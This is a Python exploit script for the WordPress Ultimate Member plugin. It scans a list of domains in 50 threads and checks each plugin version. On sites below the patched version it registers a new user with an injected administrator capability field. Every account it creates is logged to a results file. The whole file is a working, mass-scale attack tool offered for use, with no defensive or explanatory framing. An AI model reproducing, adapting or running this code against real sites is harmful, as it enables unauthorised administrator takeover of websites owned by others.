import re
import sys
import threading
import argparse
import requests
import urllib3
from colorama import Fore, Style

# Suppress InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()

# Configuration
username = ""
password = ""
email = ""
max_workers = 50

def check_version(target):
    try:
        response = requests.get(f"https://{target}/wp-content/plugins/ultimate-member/readme.txt", verify=False)
        response.raise_for_status()  # Raise an exception for non-2xx response codes
        version_match = re.search(r"Stable tag:\s*(\S+)", response.text)
        if version_match:
            version = version_match.group(1)
            return version
    except (requests.exceptions.RequestException, AttributeError):
        return None

def add_admin(target, form_id):
    headers = {'User-Agent': 'Secragon Offensive Agent'}
    
    try:
        session = requests.Session()
        response = session.get(f'https://{target}/index.php/register/', headers=headers, verify=False)
        nonce_match = re.search(r"name=\"_wpnonce\" value=\"(.{10})\"", response.text)
        if nonce_match:
            nonce = nonce_match.group(1)
        else:
            raise ValueError("Nonce not found")
    except Exception as e:
        print(Fore.RED + f"Error getting nonce: {e}")
        return
    
    data = {
        f'user_login-{form_id}': username,
        f'user_email-{form_id}': email,
        f'user_password-{form_id}': password,
        f'confirm_user_password-{form_id}': password,
        f'first_name-{form_id}': 'Exploit',
        f'last_name-{form_id}': 'bySecragon',
        'form_id': form_id,
        'um_request': '',
        '_wpnonce': nonce,
        'wp_capabilities[administrator]': 1
    }

    try:
        response = session.post(f'https://{target}/index.php/register/', data=data, headers=headers, verify=False)
        if response.history and response.history[0].status_code == 302:
            save_result(target)
            print(Fore.GREEN + "Admin added successfully.")
        else:
            print(Fore.RED + "Failed to add admin.")
    except Exception as e:
        print(Fore.RED + f"Error adding admin: {e}")

def save_result(target):
    with open('results.txt', 'a') as file:
        file.write(f"Site: {target}\n")
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write("-" * 40 + "\n")

def process_domain(domain):
    domain = domain.strip()
    print()
    print(f"Target: {domain}")
    print("-" * 40)
    
    version = check_version(domain)
    if version and int(version.replace('.', '')) < 267:
        print(Fore.GREEN + f"Site version {version} - vulnerable!")
        add_admin(domain, 6)
    else:
        print(Fore.RED + f"Site version {version} - not vulnerable.")

def process_domains(file_path):
    with open(file_path, 'r') as file:
        domains = file.readlines()

    threads = []
    
    def worker(domain):
        process_domain(domain)
        threads.remove(threading.current_thread())
    
    for domain in domains:
        domain = domain.strip()
        while len(threads) >= max_workers:
            threads[0].join()
        
        thread = threading.Thread(target=worker, args=(domain,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    print()

    parser = argparse.ArgumentParser()
    parser.add_argument('file', help='Path to the file containing the list of domains')

    if len(sys.argv) == 1:
        parser.print_help()
        print()
        sys.exit()

    args = parser.parse_args()
    process_domains(args.file)
